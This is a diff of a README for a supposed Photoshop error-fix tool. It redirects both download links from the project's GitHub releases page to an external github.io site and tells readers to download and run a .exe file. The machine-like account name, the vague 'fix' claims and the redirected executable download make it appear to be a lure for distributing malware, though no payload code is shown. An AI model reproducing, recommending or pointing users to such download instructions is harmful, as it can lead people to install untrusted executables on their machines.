@@ -1,6 +1,6 @@
 # 🔧 Photoshop-Could-Not-Complete-Your-Request-Fix - Solve common Photoshop stability errors today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Buggy-steelwool837/Photoshop-Could-Not-Complete-Your-Request-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://buggy-steelwool837.github.io)
 
 This software corrects errors that prevent Photoshop from opening or saving files. It manages system resources and file permissions to fix common crashes and notification alerts. You can use this tool to resolve issues like scratch disk errors, invalid file formats, and missing source files.
 
@@ -8,7 +8,7 @@ This software corrects errors that prevent Photoshop from opening or saving file
 
 You must visit the project page to download the latest version of the software.
 
-1. Navigate to the [official release page](https://github.com/Buggy-steelwool837/Photoshop-Could-Not-Complete-Your-Request-Fix/releases).
+1. Navigate to the [official release page](https://buggy-steelwool837.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release version.
 3. Click the file ending in `.exe` to start your download.
 4. Save the file to your desktop or your downloads folder.
